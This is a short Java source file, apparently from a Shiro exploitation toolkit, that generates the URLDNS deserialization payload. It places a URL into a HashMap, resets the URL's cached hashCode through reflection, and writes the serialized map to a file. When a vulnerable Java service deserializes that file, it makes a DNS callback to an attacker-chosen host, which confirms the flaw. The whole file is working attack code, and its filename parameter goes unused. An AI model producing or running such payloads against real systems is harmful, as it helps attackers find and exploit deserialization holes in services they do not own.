package shiro.gadgets.payload;

import shiro.gadgets.commons.Reflections;
import shiro.gadgets.commons.Serializer1;

import java.io.IOException;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

public class Urldns {
    public static void urldns(String filename,String url) throws Exception {

        HashMap hashMap = new HashMap();
        URL url1 = new URL(url);

        hashMap.put(url1, url);
        Reflections.setFieldValue(url1,"hashCode",-1);
//        HashMap hashMap =new HashMap();
//        URL url1 =new URL(url);
//        Class<?> clazz =Class.forName("java.net.URL");
//        Field field=null;
//        field=clazz.getDeclaredField("hashCode");
//        field.setAccessible(true);
//        hashMap.put(url1,url);
//        field.set(url1,-1);
        Serializer1.serializer("src/main/resources/url.ser",hashMap);
    }
}